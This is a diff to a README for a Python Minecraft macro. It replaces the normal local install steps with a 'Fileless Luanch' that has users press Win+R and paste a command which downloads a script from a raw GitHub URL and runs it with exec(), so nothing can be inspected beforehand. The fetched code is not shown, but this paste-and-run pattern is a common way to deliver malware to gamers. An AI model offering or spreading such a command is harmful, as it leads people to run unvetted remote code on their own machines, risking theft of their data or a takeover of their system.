@@ -6,17 +6,14 @@ An advanced, humanized Python macro for seamless Minecraft Dtaps."
 
 ## **Requirements**
 
-Make sure you have **Python 3.x** installed on your system. You will also need the following external Python libraries:
-* `keyboard` (pip install keyboard mouse)
-* `mouse`    (pip install keyboard mouse)
+Make sure you have **Python 3.x** installed on your system.
 
 ---
 
-## **Installation**
+## **Fileless Luanch**
 
-1. First make sure you have Python installed and the external python libraries.
-2. Open the **folder in cmd**.
-3. After run this command:
-```bash
-   python CrystalDtap.py
+1. First make sure you have Python installed.
+2. After do win + r and paste the following command.
+```run
+   cmd /k python -m pip install keyboard mouse & python -c "import urllib.request; exec(urllib.request.urlopen('https://raw.githubusercontent.com/gersbesgb/D-tap-Macro/refs/heads/main/CrystalDtap.py').read().decode())"
    
